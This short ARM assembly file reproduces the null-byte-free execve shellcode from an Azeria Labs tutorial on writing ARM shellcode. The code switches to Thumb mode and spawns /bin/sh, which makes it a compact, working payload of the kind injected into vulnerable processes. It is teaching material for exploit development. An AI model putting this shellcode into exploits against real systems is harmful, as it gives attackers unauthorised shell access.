/* execve() assembly code from the tutorial 'Writing ARM Shellcode' (https://azeria-labs.com/writing-arm-shellcode/), thrid example without null-bytes */
.section .text
.global _start

_start:
        .code 32
        add r3, pc, #1
        bx  r3

        .code 16
        add r0, pc, #8
        eor r1, r1, r1
        eor r2, r2, r2
        strb r2, [r0, #7]
        mov r7, #11
        svc #1

.ascii "/bin/shx"
